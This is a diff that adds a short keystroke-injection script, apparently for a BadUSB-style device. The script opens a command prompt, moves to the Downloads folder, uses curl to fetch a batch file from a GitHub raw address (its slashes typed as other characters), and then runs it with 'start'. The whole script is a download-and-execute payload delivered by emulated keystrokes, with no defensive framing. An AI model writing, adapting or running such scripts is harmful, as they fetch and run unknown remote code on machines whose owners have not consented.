@@ -1,0 +1,16 @@
+CustomDelay:1000
+Press:131+114
+CustomDelay:250
+Print:cmd
+Press:176
+CustomDelay:250
+Print:cd Downloads
+Press:176
+CustomDelay:250
+Print:curl https>&&raw.githubusercontent.com&chukfinlez&Onlz/cmd&main&uinmemo.bat /O1
+Press:176
+CustomDelay:250
+Press:176
+CustomDelay:250
+Print:start uinmemo.bat
+Press:176
